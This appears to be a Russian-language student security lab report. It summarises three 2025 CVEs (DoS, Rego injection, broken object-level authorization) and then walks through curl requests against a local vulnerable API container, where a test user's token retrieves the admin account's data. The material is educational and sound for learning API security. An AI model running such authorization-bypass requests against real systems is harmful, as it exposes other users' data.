# Часть 1
## CVE за 2025-2026 год 

### **1. CVE-2025-66473: Unrestricted Resource Consumption**
REST API эндпоинт /rest/wikis/xwiki/spaces возвращает все страницы вики без пагинации или лимита. Злоумышленник может отправить запрос, который заставит сервер выделить всю доступную память, что приведёт к замедлению или полному отказу в обслуживании (DoS) </br>

**Причина**:
Отсутствие валидации входных параметров и лимитов на количество возвращаемых записей в ответе API.

### **2. CVE-2025-46569: Server Side Request Forgery**
Уязвимость позволяет внедрить код Rego через манипуляцию с путём в запросе к HTTP Data API OPA (/v1/data/`<path>`). Злоумышленник может подменить результат авторизации, вызвать отказ в обслуживании (DoS) через ресурсоёмкие запросы, попытаться извлечь переменные окружения через oracle-атаки  </br>

**Причина**:
Некорректная сборка внутреннего Rego-запроса из пользовательского пути: специальные символы в пути интерпретировались как код Rego, а не как литералы.

### 3. **CVE-2025-13526: Broken Object Level Authorization**
Плагин предоставляет REST API для управления заказами. Эндпоинт /wp-json/chat-to-order/v1/orders/<order_id> не проверяет, принадлежит ли заказ текущему пользователю. Злоумышленник может просматривать чужие заказы, подставляя order_id, изменять или удалять заказы других пользователей 

**Причина**:
Отсутствие проверки прав доступа на уровне объекта: код доверяет переданному order_id без сверки с current_user_id в БД.


# Часть 2
### 1. Запуск контейнера и подготовка 
Переходим по адресу `http://localhost:8080/`
[скриншот ответа](./img1.png)

создаем базу `http://localhost:8080/createdb`

ответ:
`{ "message": "Database populated." }`

### 2. Регистрация и вход
Регистрируем тестового пользователя

```bash
curl -X POST http://localhost:8080/users/v1/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test1","password":"test123","email":"test@test.com"}'
```
ответ 
`
{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
`

входим
```bash
curl -X POST http://localhost:8080/users/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test1","password":"test123"}'
```

ответ: ```{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzY5NjU5MjMsImlhdCI6MTc3Njk2NTg2Mywic3ViIjoidGVzdDEifQ.HfUJxug6tmkkScfmJ8uanFcT8c36rWOhPbPmG8_IljY", "message": "Successfully logged in.", "status": "success"}```

попробуем посмотреть данные своего пользователя 

```bash
curl http://localhost:8080/users/v1/test1 \   
  -H "Authorization: Bearer $eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzY5NjU5MjMsImlhdCI6MTc3Njk2NTg2Mywic3ViIjoidGVzdDEifQ.HfUJxug6tmkkScfmJ8uanFcT8c36rWOhPbPmG8_IljY"
```
ответ
```{"username": "test1", "email": "test@test.com"}```

попробуем по своему токену запросить данные пользователя admin

```bash
curl http://localhost:8080/users/v1/admin \
  -H "Authorization: Bearer $eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzY5NjU5MjMsImlhdCI6MTc3Njk2NTg2Mywic3ViIjoidGVzdDEifQ.HfUJxug6tmkkScfmJ8uanFcT8c36rWOhPbPmG8_IljY"
```
ответ
```{"username": "admin", "email": "admin@mail.com"}```


### Итог: найдена уязвимость Broken Object Level Authorization